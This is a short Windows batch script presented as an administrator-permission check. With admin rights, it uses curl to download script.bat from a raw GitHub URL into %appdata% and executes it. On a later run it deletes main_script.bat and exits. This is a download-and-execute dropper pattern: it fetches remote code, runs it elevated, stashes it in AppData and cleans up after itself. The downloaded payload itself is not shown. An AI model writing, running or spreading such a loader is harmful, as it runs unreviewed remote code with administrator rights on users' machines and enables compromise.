@echo off
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...

    net session >nul 2>&1
    if %errorLevel% == 0 (
        IF EXIST %appdata%/script.bat (DEL main_script.bat && EXIT) ELSE (cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && cmd /c script.bat)
    ) else (
        echo Run As Admin
    )

    pause >nul

